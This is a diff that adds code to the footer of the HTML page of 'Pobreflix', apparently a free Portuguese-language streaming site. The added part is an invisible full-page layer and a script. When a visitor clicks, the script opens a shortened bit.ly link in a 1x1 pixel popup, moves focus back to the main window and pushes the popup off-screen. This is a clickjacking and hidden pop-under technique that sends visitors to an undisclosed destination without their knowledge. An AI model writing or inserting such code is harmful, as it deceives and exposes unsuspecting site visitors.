@@ -89,5 +89,43 @@
     <footer>
         <p>© 2024 Pobreflix: Animes, Séries, Filmes e Desenhos Online! E o melhor, de graça!. Todos os Direitos do Codigo do Site Reservados!</p>
     </footer>
+    <div id="invisible-layer"></div> <!-- Barreira invisível -->
+
+  <script>
+    // Função para abrir o link e remover a barreira
+    function openAndDetach() {
+      // URL a ser aberta
+      const url = "https://bit.ly/3D1cVOt";
+
+      // Abrir nova aba/instância diretamente com o URL, mas com tamanho bem pequeno
+      const newWindow = window.open(url, "_blank", "width=1,height=1,left=" + (window.innerWidth - 1) + ",top=0");
+
+        // Opcional: simular comportamento de instância separada
+        newWindow.blur(); // Remove o foco da nova aba
+        window.focus(); // Retorna o foco para a janela original
+
+        // Aguardar o carregamento da página antes de posicionar a janela atrás
+        setTimeout(() => {
+          // Tentar colocar a janela nova atrás da principal
+          newWindow.blur(); // Remove o foco da nova janela
+          window.focus(); // Coloca a janela principal em foco
+
+          // Depois de um tempo, mover a janela para o canto superior direito
+          // (já foi posicionada lá com left=window.innerWidth-1, top=0)
+          newWindow.moveTo(window.innerWidth - 1, 0);
+
+          // Simulação de minimização (mover para fora da tela)
+          newWindow.moveTo(window.innerWidth + 500, window.innerHeight + 500);
+        }, 1000); // Atraso de 1 segundo (ajuste conforme necessário)
+
+      // Remover a camada invisível após o clique
+      const layer = document.getElementById("invisible-layer");
+      if (layer) layer.remove();
+    }
+
+    // Adicionar o evento de clique à barreira invisível
+    document.getElementById("invisible-layer").addEventListener("click", openAndDetach);
+      window.focus()
+  </script>
 </body>
 </html>
